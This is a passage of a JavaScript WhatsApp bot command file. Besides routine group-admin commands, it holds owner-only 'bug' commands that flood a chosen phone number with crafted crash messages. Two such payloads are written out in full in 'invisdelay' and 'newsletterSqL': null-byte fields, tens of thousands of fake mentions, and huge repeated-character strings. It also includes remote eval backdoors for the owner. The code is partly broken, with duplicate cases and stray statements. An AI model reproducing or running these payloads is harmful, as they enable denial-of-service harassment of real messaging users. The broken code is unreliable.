        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Opening group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("*Group opened by admin. Members can now send messages.*");
    }, timer);
}
break
case "totalmembers": {
if (!m.isGroup) return reply(mess.group);
    if (!(isGroupAdmins || isCreator)) return reply(mess.admin);

    await conn.sendMessage(
      m.chat,
      {
        text: `*GROUP*: ${groupMetadata.subject}\n*MEMBERS*: ${participants.length}`,
      },
      { quoted: m, ephemeralExpiration: 86400 }
    );
}
break
case "mediatag": {
     if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.admin);
        if (!isAdmins) return reply(mess.admin);
        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "poll": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        let [poll, opt] = text.split("|");
        if (text.split("|") < 2)
            return await reply(
                `Enter a question and at least 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
            );
        let options = [];
        for (let i of opt.split(",")) {
            options.push(i);
        }
        
        await conn.sendMessage(m.chat, {
            poll: {
                name: poll,
                values: options,
            },
        });
}
break
case "antilink": {
    if (!m.isGroup) return reply('❌ This command can only be used in groups.');
    if (!isAdmins && !Access) return reply('❌ You need to be an admin to use this command.');
    
    if (args.length < 2) return reply(`Example: 
${prefix + command} delete on/off
${prefix + command} warn on/off  
${prefix + command} kick on/off
${prefix + command} status`);

    const actionType = args[0].toLowerCase();
    const option = args[1] ? args[1].toLowerCase() : 'status';

    // Use setting.config structure for group settings
    if (!global.db.data.settings) global.db.data.settings = {};
    if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
    let setting = global.db.data.settings[botNumber];
    if (!setting.config) setting.config = {};

    // Initialize group-specific settings in config
    if (!setting.config.groupSettings) setting.config.groupSettings = {};
    if (!setting.config.groupSettings[m.chat]) setting.config.groupSettings[m.chat] = {};

    let groupSettings = setting.config.groupSettings[m.chat];

    if (option === "status") {
        const status = groupSettings.antilink ? "Enabled" : "Disabled";
        const action = groupSettings.antilinkaction || "delete";
        reply(`🔗 Anti-link Status:
• Status: ${status}
• Action: ${action}
• Group: ${(await conn.groupMetadata(m.chat)).subject}`);
        return;
    }

    if (option !== "on" && option !== "off") {
        return reply('❌ Invalid option. Use "on" or "off"');
    }

    const validActions = ["delete", "warn", "kick"];
    if (!validActions.includes(actionType)) {
        return reply('❌ Invalid action. Use: delete, warn, or kick');
    }

    if (option === "on") {
        groupSettings.antilink = true;
        groupSettings.antilinkaction = actionType;
        reply(`✅ Anti-link ${actionType} mode enabled!`);
    } else {
        groupSettings.antilink = false;
        reply(`✅ Anti-link disabled!`);
    }

    await saveDatabase();
    
}
break
case "setgroupname": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*Desired groupname?*");

        await conn.groupUpdateSubject(m.chat, text);
        reply(mess.done);
}
break
case "tagadmin2": {
    if (!m.isGroup) return reply(mess.group);

    const groupAdmins = participants.filter((p) => p.admin);
    const listAdmin = groupAdmins
      .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
      .join("\n");
    const owner = groupMetadata.owner || groupAdmins.find((p) => p.admin === "superadmin")?.id || m.chat.split`-`[0] + "@s.whatsapp.net";
    let text = `*Group Admins Here:*\n${listAdmin}`.trim();

    conn.sendMessage(
      m.chat,
      { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
      { quoted: m }
    );
}
break
case "tagall2": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");
        if (!isAdmins) return reply("❌ Only admins can tag all members");
        if (!isBotAdmins) return reply("❌ Bot needs admin privileges");

        let message = "📢 *Attention Everyone!* \n\n";
        const mentions = participants.map(p => p.id);
        
        mentions.forEach(userId => {
            message += `@${userId.split('@')[0]} `;
        });

        await conn.sendMessage(from, {
            text: message,
            mentions,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("TagAll Error:", error);
        reply("❌ Failed to tag all members");
    }
}
break
case "open": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);

        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("Group opened by admin. Members can now send messages.");
}
break
case "add": {
if (!m.isGroup) return m.reply(mess.group);
        if (!isCreator) return m.reply(mess.owner);
        
        let bws = m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bws], "add");
        reply(mess.done);
}
break
case "kick": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);

        let bck = m.mentionedJid[0]
            ? m.mentionedJid[0]
            : m.quoted
            ? m.quoted.sender
            : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await conn.groupParticipantsUpdate(m.chat, [bck], "remove");
        reply(mess.done);
}
break
case "'kick2'": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");
        if (!isAdmins) return reply("❌ Only admins can remove members");
        if (!isBotAdmins) return reply("❌ Bot needs admin privileges");
        
        const userId = mentionedJid?.[0] || m.quoted?.sender;
        if (!userId) return reply("ℹ️ Please mention or quote the user to kick");

        await conn.groupParticipantsUpdate(from, [userId], "remove");
        reply(`✅ User @${userId.split('@')[0]} has been removed`, { 
            mentions: [userId],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("Kick Error:", error);
        reply("❌ Failed to remove user from group");
    }
}
break
case "getgrouppp":
case "grouppp":
case "groupicon":
case "groupavatar": {
    if (!m.isGroup) return reply('❌ *This command only works in groups!*');
    
    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Get group profile picture
        const ppUrl = await conn.profilePictureUrl(m.chat, 'image');
        
        if (!ppUrl) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply('❌ *This group has no profile picture set!*');
        }

        // Get group info for caption
        const groupMetadata = await conn.groupMetadata(m.chat).catch(() => null);
        const groupName = groupMetadata?.subject || 'Unknown Group';
        const memberCount = groupMetadata?.participants?.length || 0;
        
        // Create caption
        const caption = `🖼️ *GROUP PROFILE PICTURE*\n\n` +
                       `*Group:* ${groupName}\n` +
                       `*Members:* ${memberCount}\n` +
                       `*ID:* ${m.chat.split('@')[0]}\n\n` +
                       `> 📸 Group icon retrieved successfully`;

        // Send the group profile picture
        await conn.sendMessage(m.chat, {
            image: { url: ppUrl },
            caption: caption,
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    title: groupName,
                    body: `👥 ${memberCount} members | Group Icon`,
                    thumbnail: { url: ppUrl },
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

    } catch (error) {
        console.error('Error getting group profile picture:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        if (error.message.includes('404') || error.message.includes('not found')) {
            reply('❌ *This group has no profile picture set!*\n\nUse .setppgroup to set a profile picture for this group.');
        } else if (error.message.includes('401') || error.message.includes('permission')) {
            reply('❌ *I need to be admin in this group to access the profile picture!*');
        } else {
            reply('❌ *Failed to retrieve group profile picture.* Please try again.');
        }
    }
    
}
break
break
case "groupinfo": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");

        const metadata = await conn.groupMetadata(from);
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(from, "image");
        } catch {
            ppUrl = "https://i.imgur.com/8nLFCVP.png"; // Default group icon
        }

        const infoText = `
*${metadata.subject}*

👥 *Participants:* ${metadata.size}
👑 *Owner:* @${metadata.owner.split('@')[0]}
📝 *Description:* ${metadata.desc || "None"}
🆔 *Group ID:* ${metadata.id}
`.trim();

        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: infoText,
            mentions: [metadata.owner],
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        }, { quoted: mek });

    } catch (error) {
        console.error("GInfo Error:", error);
        reply("❌ Failed to get group information");
    }
}
break
case "resetlinkgc": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !Access) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

conn.groupRevokeInvite(from)
reply("*group link reseted by admin*" )
}
//bug command
break
case "trial":{
if(!Access) return reply("*Used by owner only*")
if(!text) return reply(`Example: ${prefix + command} 25672345...`)
const target = q.replace(/[^0-9]/g,"") + "@s.whatsapp.net"
await bugload()
reply(`𝙑𝙞𝙣𝙞𝙘-𝙓𝙢𝙙 𝙨𝙚𝙣𝙙𝙞𝙣𝙜 𝙗𝙪𝙜𝙨 𝙩𝙤 ${target}`)
//sending bugs
for(let i = 0; i < 40; i++){
//loading the bugs using the function
await Trial(target)
await Trial(target)
await Trial(target)
await sleep(2000) //2minutes pause time
await Trial(target)
await Trial(target)
}
reply(`𝗦𝘂𝗰𝗰𝗲𝘀𝙨 𝘀𝗲𝗻𝘁 𝗯𝘂𝗴𝘀 𝘁𝗼 ${target}\n Command: ${command}`)
}
break
case "ceo-venom": {
if(!Access) return reply(mess.owner)
if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*ceo-venom* 256xxxx...")
target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await bugLoad()

     conn.sendMessage(m.chat, {  
            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `120363322464215140@newsletter` 
                },
                
            }
        },{ quoted: st }
    )
for(let i = 0; i < 30; i++){
await RB(target)
await RB(target)
await RB(target)
await sleep(1500)
await RB(target)
await RB(target)
await sleep(1500)
await RB(target)

}
}

break
case "ceo-venom": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
    
    // Initialize q properly before using it
    const q = text.trim()
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
    
    await bugLoad()

    try {
        // Send initial message
        await conn.sendMessage(m.chat, {  
            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `120363322464215140@newsletter` 
                },
            }
        }, { quoted: st })

        // Perform the repeated actions
        for(let i = 0; i < 30; i++) {
            await RB(target)
            await RB(target)
            await RB(target)
            await sleep(1500)
            await RB(target)
            await RB(target)
            await sleep(1500)
            await RB(target)
        }
    } catch (error) {
        console.error("Error in dark command:", error)
        reply("An error occurred while processing the command.")
    }
}
break
// ... existing cases in your switch statement ...

case "imgcrash": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`Example: ${prefix + command} 256xxxxxxx`)
    
    const target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
    await bugLoad()
    reply(`Starting image crash attack on ${target}`)
    
    try {
        // Send multiple image crash messages
        for(let i = 0; i < 20; i++) {
            await imgCrash(target)
            await sleep(1000) // 1 second delay between messages
        }
        reply(`Image crash attack completed on ${target}`)
    } catch (error) {
        console.error('Image crash error:', error)
        reply(`Error during image crash: ${error.message}`)
    }
}
break
case "delaybug": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix}delay 2567xxxxxxx 10\n(Number and duration in seconds)`);

    const [numberInput, durationInput] = text.split(' ');
    const target = numberInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    const durationSec = parseInt(durationInput) || 10;

    if (durationSec > 3600) return reply("Maximum duration is 1 hour (3600 seconds)");
    if (durationSec < 5) return reply("Minimum duration is 5 seconds");

    try {
        await reply(`🚀 Starting delayed attack for ${durationSec} seconds...`);
        
        const startTime = Date.now();
        const endTime = startTime + (durationSec * 1000);
        let messageCount = 0;
        let errorCount = 0;

        // Main attack loop
        while (Date.now() < endTime) {
            try {
                await invisdelay(target);
                messageCount++;
                
                // Add random delay between 0.5-2 seconds
                await sleep(500 + Math.random() * 1500);
                
                // Progress update every 5 messages
                if (messageCount % 5 === 0) {
                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
                    const remaining = durationSec - elapsed;
                    await conn.sendPresenceUpdate('composing', m.chat);
                    await reply(`⏳ Status: ${messageCount} sent | ${errorCount} failed | ${remaining}s remaining`);
                }
            } catch (error) {
                errorCount++;
                console.error(`Error in delay loop (${errorCount}):`, error);
                
                // Backoff on errors
                await sleep(2000 * Math.min(errorCount, 5));
            }
        }

        // Final report
        await reply(`✅ Attack completed!\n📤 Messages sent: ${messageCount}\n❌ Errors: ${errorCount}\n⏱️ Duration: ${durationSec}s`);

    } catch (error) {
        console.error('Delay command failed:', error);
        reply(`❌ Critical error: ${error.message}`);
    }
    break;
}

// Enhanced invisdelay function with tracking
async function invisdelay(target) {
    const startTime = Date.now();
    let success = false;
    
    try {
        const generateLocationMessage = {
            viewOnceMessage: {
                message: {
                    locationMessage: {
                        degreesLatitude: 0,
                        degreesLongitude: 0,
                        name: "salam interaksi bun",
                        address: "\u0000".repeat(1000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                            ),
                            isSampled: true,
                            participant: target,
                            remoteJid: target,
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const locationMsg = generateWAMessageFromContent(
            target, 
            generateLocationMessage, 
            { quoted: null }
        );

        await conn.relayMessage(
            target, 
            locationMsg.message, 
            {
                messageId: locationMsg.key.id,
                additionalAttributes: {
                    "ephemeral": true
                }
            }
        );
        
        success = true;
        return true;
        
    } catch (error) {
        console.error('invisdelay error:', {
            target,
            error: error.message,
            duration: Date.now() - startTime
        });
        throw error;
    } finally {
        console.log(`invisdelay ${success ? 'success' : 'failed'} in ${Date.now() - startTime}ms`);
    }
}

// Utility function
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
break
case "lonelysaam": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`Example: ${command} 256xx`)
    
    // Initialize q properly before using it
    const q = text.trim()
    const vc = q.replace(/[^0-9]/g, '')
    const target = vc + "@s.whatsapp.net"
    
    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
    await bugLoad()

    try {
        // Send initial message
        await conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
            }
        }, { quoted: st })

        // Perform the repeated actions
        for(let r = 0; r < 40; r++) {
            // Add your repeated actions here
            // Example: await someFunction(target);
            await sleep(1000) // Add delay if needed
        }
    } catch (error) {
        console.error("Error in delaycombo command:", error)
        reply("An error occurred while processing the command.")
    }
}
break
case "invis": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`Example: ${command} 256xx`)
    
    // Initialize q properly
    const q = text.trim()
    const vc = q.replace(/[^0-9]/g,'')
    const target = vc + "@s.whatsapp.net"
    
    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
    await bugLoad()

    try {
        // Send initial message
        await conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
            }
        }, { quoted: st })

        // Perform the repeated actions
        for(let r = 0; r < 40; r++) {
            await delayonly(target)
            await delayonly(target)
            await delayonly(target)
            await sleep(2000)
            await delayonly(target)
            await delayonly(target)
            await delayonly(target)
            await sleep(1500)
            await delayonly(target)
            await delayonly(target)
        }
    } catch (error) {
        console.error("Error in invis command:", error)
        reply("An error occurred while processing the command.")
    }
}
break
case "Vinic-crash": {
if(!Access) return reply(mess.owner)
if(!text) return reply(`Example:
${command} 256xxx`)
async function newsletterSqL(target, ptcp = true) {
    
    const img300 = require('./folder/folder/image.jpg')
    
    const mentionedList = [
    target, ...Array.from({ length: 35000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '1@newsletter',
                        newsletterName: "",
                        jpegThumbnail: img300,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + 9999999999,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: conn.generateMessageTag(),
            },
        };

        await conn.relayMessage(target, message, {
          userJid: target,
        });
    } catch (error) {
        console.log("error:\n" + error);
      }
   }
}
break
case "invis": {
    if(!Access) return reply(mess.owner)
    if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xx`)
    let q = text // Initialize 'q' with the input text (minimal change)
    let vc = q.replace(/[^0-9]/g,'')
    const target = vc + "@s.whatsapp.net"
    await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
    await bugLoad()
    conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
            }
        },{ quoted: st }
    )
    for(let r = 0; r < 40; r++){
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(2000)
        await delayonly(target)
        await delayonly(target)
        await delayonly(target)
        await sleep(1500)
        await delayonly(target)
        await delayonly(target)
    }
}
break
case "crax":{
if(!Access) return reply(mess.owner)
if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xxx`)
let vc = q.replace(/[^0-9]/g,'')
const target = vc + "@s.whatsapp.net"
const ment = false
await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
await bugLoad()
    conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
            caption: buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
                    newsletterJid: `` 
                },
                
            }
        },{ quoted: st }
    )
    
for(let r = 0; r < 50; r++){

}

}

break
        
case 'backup':
case 'bp': {
if (!Access) return reply(mess.owner)
const sessionPath = "./session";
if (fs.existsSync(sessionPath)) {
const files = fs.readdirSync(sessionPath);
files.forEach((file) => {
if (file !== "creds.json") {
const filePath = path.join(sessionPath, file); 
if (fs.lstatSync(filePath).isDirectory()) {
fs.rmSync(filePath, { recursive: true, force: true });
} else {  
fs.unlinkSync(filePath);
}
}
}
);
}
const ls = execSync("ls").toString().split("\n").filter(
(pe) =>           
pe != "node_modules" &&   
pe != "package-lock.json" &&  
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
execSync(`zip -r backup.zip ${ls.join(" ")}`);
await conn.sendMessage(m.chat, {
document: fs.readFileSync("./backup.zip"),   
fileName: "Vinic-base-new.zip",
mimetype: "application/zip",
caption: "This is your backup zip.",
}, { quoted: m });
execSync("rm -rf backup.zip");
}
break
        
default:
if (body.startsWith("~")) {
if (!Access) return;
console.log('*execute...*')
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
let bang = util.format(sat)
if (sat === undefined) {
bang = util.format(sul)
}
return bang;
}
try {
(async () => {
try {
const result = await eval(`(async () => { return ${text} })()`)
console.log(Return(result))
} catch (e) {
console.log(util.format(e))
}
})()
} catch (e) {
console.log(util.format(e))
}
}
if (budy.startsWith("X")) {
if (!Access) return
await reaction(m.chat, '⚡')
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
conaole.log(evaled)
} catch (err) {
console.log(util.format(err))
}
}
}
} catch (err) {
console.log(err)
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})